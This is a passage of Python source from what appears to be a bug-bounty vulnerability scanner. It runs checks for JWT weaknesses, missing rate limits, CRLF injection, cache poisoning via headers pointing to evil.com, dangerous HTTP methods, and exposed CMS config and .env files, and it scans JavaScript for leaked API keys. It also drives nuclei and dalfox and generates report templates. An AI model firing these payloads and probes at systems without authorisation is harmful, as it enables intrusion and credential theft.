            findings.append({"type":"GraphQL Batching (DoS)","severity":"medium",
                            "url":url,"detail":"Array batching accepted — rate limit bypass possible",
                            "impact":"DoS, rate limit bypass, brute force"})

    # ──────────────────────────────────────────
    # 16. JWT Vulnerabilities
    # ──────────────────────────────────────────
    p("[hunt] 16/25 — JWT vulnerabilities...")
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
    jwt_found = set()
    for url in urls[:60]:
        for m in jwt_re.findall(url):
            jwt_found.add(m)

    import base64 as b64
    for jwt_val in list(jwt_found)[:5]:
        parts = jwt_val.split(".")
        if len(parts) == 3:
            try:
                header_b = parts[0] + "==" * (4 - len(parts[0]) % 4)
                hdr_data = json.loads(b64.urlsafe_b64decode(header_b).decode())
                algo = hdr_data.get("alg","")
                issues = []
                if algo.lower() == "none": issues.append("alg:none — signature bypass")
                if algo.upper() in ["HS256","HS384","HS512"]:
                    issues.append(f"{algo} — symmetric key, brute-forceable")
                if issues:
                    findings.append({"type":"JWT Vulnerability","severity":"high",
                                    "detail":f"Algorithm: {algo} | Issues: {'; '.join(issues)}",
                                    "impact":"Authentication bypass, privilege escalation"})
                    p(f"[hunt]   ⚠ JWT issue: {', '.join(issues)}")
            except: pass

    # ──────────────────────────────────────────
    # 17. Rate Limit / Brute Force
    # ──────────────────────────────────────────
    p("[hunt] 17/25 — Rate limiting / Brute force protection...")
    rate_targets = auth_urls[:3] + [base+"/api/login",base+"/api/auth",base+"/login"]
    for url in rate_targets[:3]:
        responses = []
        for i in range(15):
            s, _, hdrs = hget(url, {"X-Forwarded-For":f"10.0.0.{i+1}"})
            responses.append(s)
        blocked = sum(1 for s in responses if s in [429,403])
        if blocked == 0 and any(s not in [0,500] for s in responses):
            findings.append({"type":"No Rate Limiting","severity":"medium",
                            "url":url,
                            "detail":f"15 requests — none rate-limited (statuses: {set(responses)})",
                            "impact":"Brute force, credential stuffing, API abuse, DoS"})
            p(f"[hunt]   ⚠ No rate limiting: {url[:55]}")

    # ──────────────────────────────────────────
    # 18. CRLF Injection
    # ──────────────────────────────────────────
    p("[hunt] 18/25 — CRLF / Header Injection...")
    crlf_payloads = [
        "%0d%0aSet-Cookie:astra_injected=1",
        "%0aX-Injected:astra",
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK",
        "/%0d%0aSet-Cookie:astra=pwned;Path=/",
    ]
    for url in (get_urls if get_urls else [base])[:10]:
        for pl in crlf_payloads[:2]:
            test_url = url + pl
            s, body, hdrs = hget(test_url)
            hdrs_str = str(hdrs)
            if "astra_injected" in hdrs_str or "X-Injected" in hdrs_str:
                findings.append({"type":"CRLF / Header Injection","severity":"high",
                                "url":test_url,"payload":pl,
                                "detail":"Injected header reflected in response",
                                "impact":"Session fixation, XSS, cache poisoning"})
                p(f"[hunt]   ⚠ CRLF injection: {url[:55]}")

    # ──────────────────────────────────────────
    # 19. Cache Poisoning
    # ──────────────────────────────────────────
    p("[hunt] 19/25 — Cache Poisoning...")
    cache_tests = [
        {"X-Forwarded-Host": "evil.com"},
        {"X-Host":           "evil.com"},
        {"X-Forwarded-Server":"evil.com"},
        {"X-Original-URL":   "/admin"},
        {"X-Rewrite-URL":    "/admin"},
        {"X-Original-Host":  "evil.com"},
    ]
    for extra in cache_tests[:4]:
        s, body, hdrs = hget(base, extra)
        hdr_name = list(extra.keys())[0]
        hdr_val  = list(extra.values())[0]
        if hdr_val in body or hdr_val in str(hdrs.get("Location","")):
            findings.append({"type":"Cache Poisoning / Header Reflection","severity":"high",
                            "url":base,"header":hdr_name,
                            "detail":f"{hdr_name}: {hdr_val} reflected in response",
                            "impact":"Cache poisoning, XSS delivery, admin panel bypass"})
            p(f"[hunt]   ⚠ Cache poisoning via {hdr_name}")

    # ──────────────────────────────────────────
    # 20. HTTP Methods
    # ──────────────────────────────────────────
    p("[hunt] 20/25 — Dangerous HTTP methods...")
    for api_path in ["/api","/api/v1","/api/v2","","/rest"]:
        url = base + api_path
        for method in ["PUT","DELETE","PATCH","TRACE","OPTIONS","CONNECT"]:
            s, body, hdrs = _http(url, method=method, base_headers=header_dict)
            if method == "TRACE" and "TRACE" in body:
                findings.append({"type":"HTTP TRACE Enabled (XST)","severity":"medium",
                                "url":url,"detail":"TRACE method returns request headers",
                                "impact":"HTTP Header theft, credential exposure"})
            elif method in ["PUT","DELETE","PATCH"] and s in [200,201,204]:
                findings.append({"type":f"Dangerous HTTP Method: {method}","severity":"medium",
                                "url":url,"detail":f"HTTP {method} returns {s}",
                                "impact":"Unauthorized data creation/modification/deletion"})
            # Allow header check
            allow = hdrs.get("Allow","")
            if allow and any(m in allow for m in ["PUT","DELETE","TRACE"]):
                findings.append({"type":"Dangerous Methods in Allow Header","severity":"low",
                                "url":url,"detail":f"Allow: {allow}",
                                "impact":"Unnecessary attack surface exposed"})
                break

    # ──────────────────────────────────────────
    # 21. Information Disclosure
    # ──────────────────────────────────────────
    p("[hunt] 21/25 — Information disclosure...")
    s, body, hdrs = hget(base)
    server = hdrs.get("Server","")
    powered = hdrs.get("X-Powered-By","")
    aspnet_ver = hdrs.get("X-AspNet-Version","")

    if server: findings.append({"type":"Server Version Disclosure","severity":"low",
                                "url":base,"detail":f"Server: {server}",
                                "impact":"Technology fingerprinting, targeted CVE exploits"})
    if powered: findings.append({"type":"Technology Disclosure","severity":"low",
                                 "url":base,"detail":f"X-Powered-By: {powered}",
                                 "impact":"Technology fingerprinting"})
    if aspnet_ver: findings.append({"type":"ASP.NET Version Disclosure","severity":"medium",
                                    "url":base,"detail":f"X-AspNet-Version: {aspnet_ver}",
                                    "impact":"Targeted .NET vulnerability exploitation"})

    # Error page fingerprinting
    for path in ["/notfound_astra_test","/astra_error_test.php"]:
        se, be, _ = hget(base+path)
        if se == 500 or any(x in be.lower() for x in [
            "traceback","stack trace","exception","at line","debug","symfony","laravel","rails"
        ]):
            findings.append({"type":"Error / Debug Info Disclosure","severity":"medium",
                            "url":base+path,"detail":"Stack trace or debug info in error response",
                            "impact":"Technology & path disclosure, easier targeted attacks"})

    # ──────────────────────────────────────────
    # 22. CMS-Specific Vulnerabilities
    # ──────────────────────────────────────────
    p("[hunt] 22/25 — CMS-specific checks...")
    cms_checks = {
        "WordPress": [
            ("/wp-json/wp/v2/users","User enumeration via REST API","high"),
            ("/wp-config.php.bak","WordPress config backup exposed","critical"),
            ("/?author=1","Author ID enumeration","low"),
            ("/wp-includes/version.php","WP version exposed","low"),
            ("/wp-content/debug.log","Debug log exposed","high"),
        ],
        "Laravel": [
            ("/_debugbar","Laravel Debugbar exposed","high"),
            ("/telescope","Laravel Telescope exposed","high"),
            ("/.env","Laravel .env file","critical"),
            ("/storage/logs/laravel.log","Laravel log file","high"),
        ],
        "Spring": [
            ("/actuator/env","Spring actuator env — credential exposure","critical"),
            ("/actuator/heapdump","Spring heap dump — memory dump","critical"),
            ("/actuator/mappings","Spring mappings — all routes","medium"),
            ("/actuator/beans","Spring beans info","medium"),
        ],
        "Django": ["/admin/","/__debug__/","/django-admin/"],
        "Drupal":  ["/CHANGELOG.txt","/?q=user/register","/core/CHANGELOG.txt"],
        "Joomla":  ["/configuration.php.bak","/README.txt","/administrator/"],
        "Node.js": ["/.npmrc","/package.json","/.env"],
    }
    for cms, paths in cms_checks.items():
        for item in paths:
            if isinstance(item, tuple):
                path, desc, sev = item
            else:
                path, desc, sev = item, f"{cms} path exposed", "medium"
            s, body, _ = hget(base+path)
            if s == 200 and len(body) > 30:
                findings.append({"type":f"{cms} — {desc}","severity":sev,
                                "url":base+path,
                                "detail":f"HTTP 200 — {len(body)} bytes returned",
                                "impact":f"{cms}-specific attack surface"})
                p(f"[hunt]   ⚠ {cms}: {path}")

    # ──────────────────────────────────────────
    # 23. WAF Detection & Bypass Hints
    # ──────────────────────────────────────────
    p("[hunt] 23/25 — WAF / CDN detection...")
    waf_sigs = {
        "Cloudflare":  ["cf-ray","__cfduid","cloudflare","cf-cache-status"],
        "AWS WAF":     ["x-amzn-requestid","x-amz-cf-id","awselb","x-amz-rid"],
        "Akamai":      ["x-check-cacheable","x-akamai-transformed","akamai"],
        "Imperva":     ["incap_ses","visid_incap","x-iinfo","x-cdn=imperva"],
        "F5 BIG-IP":   ["bigipserver","x-cnection","TS01","F5-TrafficShield"],
        "Sucuri":      ["x-sucuri-id","sucuri-clientside","x-sucuri-cache"],
        "Barracuda":   ["barra_counter_session","bni_persistence"],
    }
    hdrs_combined = str(hdrs).lower()
    for waf, sigs in waf_sigs.items():
        if any(sig.lower() in hdrs_combined for sig in sigs):
            findings.append({"type":f"WAF Detected: {waf}","severity":"info",
                            "url":base,"detail":f"WAF signature detected: {waf}",
                            "impact":"WAF bypass techniques needed; encoding, case variation, chunked encoding"})
            p(f"[hunt]   WAF detected: {waf}")
            break

    # ──────────────────────────────────────────
    # 24. JS Secrets (from recon)
    # ──────────────────────────────────────────
    p("[hunt] 24/25 — JavaScript secrets & API keys...")
    secrets_file = d/"js_secrets.json"
    if not secrets_file.exists():
        js_urls_hunt = [u for u in urls if ".js" in u and "?" not in u][:20]
        secret_patterns = {
            "AWS Access Key":  r'AKIA[0-9A-Z]{16}',
            "Google API Key":  r'AIza[0-9A-Za-z\-_]{35}',
            "GitHub Token":    r'gh[pousr]_[0-9a-zA-Z]{36}',
            "Slack Token":     r'xox[baprs]-[0-9a-zA-Z]{10,48}',
            "JWT":             r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
            "Private Key":     r'-----BEGIN\s+(?:RSA|EC|DSA|OPENSSH)\s+PRIVATE\s+KEY',
            "API Key":         r'api[_-]?key\s*[=:]\s*["\'][a-zA-Z0-9_\-]{16,}["\']',
            "DB Connection":   r'(?:mongodb|mysql|postgres|redis)://[^\s"\'<>]{10,}',
            "Stripe Live Key": r'sk_live_[0-9a-zA-Z]{24}',
            "Twilio":          r'SK[0-9a-fA-F]{32}',
        }
        for js_url in js_urls_hunt:
            s, content, _ = hget(js_url)
            if s == 200 and content:
                for name, pattern in secret_patterns.items():
                    ms = re.findall(pattern, content, re.IGNORECASE)
                    for m in ms[:2]:
                        findings.append({"type":f"Secret: {name}","severity":"critical",
                                        "url":js_url,"match":str(m)[:80],
                                        "detail":f"{name} found in {js_url}",
                                        "impact":"Credential theft, cloud account takeover"})
                        p(f"[hunt]   ⚠ SECRET found: {name} in {js_url[:50]}")
    else:
        saved_secrets = json.loads(secrets_file.read_text())
        for sec in saved_secrets:
            findings.append({"type":f"Secret: {sec['type']}","severity":"critical",
                            "url":sec.get("url",""),
                            "detail":sec.get("match",""),
                            "impact":"Credential theft, account takeover"})

    # ──────────────────────────────────────────
    # 25. Full Nuclei Scan (everything)
    # ──────────────────────────────────────────
    p("[hunt] 25/25 — Nuclei full vulnerability scan...")
    if shutil.which("nuclei"):
        tf = d/"hunt_targets.txt"
        all_targets = [f"https://{target}",f"http://{target}"] + \
                      [f"https://{s}" for s in subs[:15]]
        tf.write_text("\n".join(all_targets))
        out = _run(["nuclei","-l",str(tf),
                   "-severity","critical,high,medium,low",
                   "-silent","-timeout","15",
                   "-bulk-size","50","-concurrency","50",
                   "-rate-limit","250","-json"]+header_args, timeout=900)
        nc = 0
        for line in out.splitlines():
            try:
                j = json.loads(line)
                sev  = j.get("info",{}).get("severity","medium")
                name = j.get("info",{}).get("name","Nuclei Finding")
                host = j.get("host","")
                findings.append({"type":f"Nuclei: {name}","severity":sev,
                                "url":host,
                                "template":j.get("template-id",""),
                                "detail":j.get("matched-at",""),
                                "impact":j.get("info",{}).get("description","")[:200]})
                nc += 1
            except:
                if line.strip() and "[" in line:
                    findings.append({"type":"Nuclei Finding","severity":"medium","detail":line.strip()})
                    nc += 1
        p(f"[hunt]   Nuclei: {nc} findings")

    # Deduplicate & sort by severity
    seen = set()
    unique_findings = []
    sev_order = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
    for f in findings:
        key = f.get("type","") + f.get("url","") + f.get("payload","")
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)

    unique_findings.sort(key=lambda x: sev_order.get(x.get("severity","info").lower(), 5))
    (d/"findings.json").write_text(json.dumps(unique_findings, indent=2))

    p(f"[hunt] ✓ Ultra-scan complete! {len(unique_findings)} unique findings")
    return unique_findings

# ═══════════════════════════════════════════════
def validate_finding(finding_text):
    return {"questions":[
        "Can an attacker trigger this right now without special preconditions?",
        "Does it have real security impact — data theft, account takeover, RCE, etc.?",
        "Can you reproduce it reliably with clear, documented steps?",
        "Is this endpoint/target in scope for the bug bounty program?",
        "Is this a genuine vulnerability, not a theoretical or accepted risk?",
        "Do you have a working proof-of-concept or verifiable evidence?",
        "Have you verified it's not already a known duplicate or N/A?",
    ], "finding": finding_text}

def generate_report(target, finding, severity, impact, steps, tools_used="", vuln_type=""):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    cvss = {"Critical":"9.0-10.0","High":"7.0-8.9","Medium":"4.0-6.9","Low":"0.1-3.9"}
    report = f"""# Bug Bounty Report — {finding}

**Title:** {finding}
**Target:** {target}
**Severity:** {severity} | **CVSS:** {cvss.get(severity,'N/A')}
**Type:** {vuln_type or 'Web Application Security'}
**Date:** {datetime.now().strftime('%Y-%m-%d')}

---

## Summary
A **{severity.upper()}** severity vulnerability was identified on `{target}`.

## Impact
{impact}

## Steps to Reproduce
{steps}

## Proof of Concept
```
[Insert HTTP request/response, screenshots, or video]
```

## Tools Used
{tools_used or 'Astra Security Agent v6.0'}

## Remediation
1. Immediate: Disable/patch the vulnerable endpoint
2. Short-term: Implement input validation & output encoding
3. Long-term: Security audit for similar patterns

## References
- OWASP: https://owasp.org/www-project-web-security-testing-guide/
- CWE: https://cwe.mitre.org/

---
*Astra Security Research Agent v6.0*
"""
    d = Path("reports")
    d.mkdir(exist_ok=True)
    path = d/f"report_{target.replace('.','_')}_{ts}.md"
    path.write_text(report)
    return report, str(path)

def get_saved_targets():
    return [d.name for d in OUTPUT_BASE.iterdir() if d.is_dir()] if OUTPUT_BASE.exists() else []

def whatweb_scan(target):
    if shutil.which("whatweb"):
        return _run(["whatweb","--color=never","-a","3",f"https://{target}"],timeout=30)
    if shutil.which("httpx"):
        return _run(["httpx","-u",f"https://{target}","-silent","-tech-detect","-title","-status-code"],timeout=15)
    return "Install whatweb or httpx for detection"

def scan_single_url(url, headers=""):
    results = []
    ha = []
    if headers:
        for h in headers.split("\n"):
            if ":" in h: ha+=["-H",h.strip()]
    if shutil.which("nuclei"):
        out = _run(["nuclei","-u",url,"-severity","critical,high,medium","-silent","-timeout","10"]+ha,timeout=120)
        for line in out.splitlines():
            if line.strip(): results.append({"tool":"nuclei","detail":line,"severity":"medium"})
    if shutil.which("dalfox") and "?" in url:
        out = _run(["dalfox","url",url,"--silence","--no-spinner"]+ha,timeout=30)
        if out and ("POC" in out or "[V]" in out):
            results.append({"tool":"dalfox","detail":out[:300],"severity":"high","type":"XSS"})
    return results
